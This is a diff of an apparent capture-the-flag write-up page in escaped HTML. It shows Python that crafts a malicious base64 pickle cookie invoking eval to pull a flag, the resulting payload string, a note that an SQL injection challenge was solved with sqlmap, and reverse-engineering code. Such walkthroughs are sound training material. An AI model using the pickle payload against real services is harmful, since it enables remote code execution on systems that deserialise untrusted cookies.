 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;json&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
@@ -1157,19 +1161,19 @@ My solution uses eval to execute a string.&lt;/p&gt;
     &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;----------------------------------------------------------------------------------------&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;epoch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Epoch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'123'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;cookie2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pickle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;epoch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Here'&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;your&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'+str(cookie2))&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    return {&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;        '&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;statusCode&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;': 200,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;        '&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;': json.dumps('&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Hello&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Lambda&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;')&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    }&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Here's your payload: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;'statusCode'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;'body'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Hello from Lambda!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
 
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;which gave us&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gANjYnVpbHRpbnMKZXZhbApxAFhvAAAAX19pbXBvcnRfXygnaW5zcGVjdCcpLmN1cnJlbnRmcmFtZSgpLmZfZ2xvYmFsc1snRXBvY2gnXShfX2ltcG9ydF9fKCdpbnNwZWN0JykuY3VycmVudGZyYW1lKCkuZl9nbG9iYWxzWydmbGFnJ10pcQGFcQJScQMu
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Enter this value to cookie and send request.Flag will be yours.&lt;/p&gt;
+&lt;p&gt;Enter this value to cookie and send request. Flag will be yours.&lt;/p&gt;
 
 &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
@@ -1204,7 +1208,6 @@ exploit
 
 &lt;h1 id=&quot;whos-sequel&quot;&gt;Who’s Sequel?&lt;/h1&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://pr28v5drz5.execute-api.eu-west-2.amazonaws.com/default/n9h9me
-
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;As the title itself gave us the hint that it is vulnerable to SQLi injection.&lt;/p&gt;
@@ -1213,7 +1216,7 @@ exploit
 
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_33.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;On entering &lt;code class=&quot;highlighter-rouge&quot;&gt;'&lt;/code&gt; in the username and password.it gave us SQL error. then I just used Sqlmap to get the flag.&lt;/p&gt;
+&lt;p&gt;On entering &lt;code class=&quot;highlighter-rouge&quot;&gt;'&lt;/code&gt; in the username and password.it gave us SQL error. Then I just used Sqlmap to get the flag.&lt;/p&gt;
 
 &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
@@ -1277,8 +1280,8 @@ exploit
     &lt;span class=&quot;n&quot;&gt;local_244&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_244&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;#print(local_38)
 &lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;local_38&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;130&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;81&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;156&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;149&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;163&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;222&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-
+&lt;span class=&quot;c1&quot;&gt;#local_38=[0, 17, 130, 81, 156, 20, 149, 163, 89, 222, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
+&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;local_1a8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_1a8&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;local_1a8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_1a8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
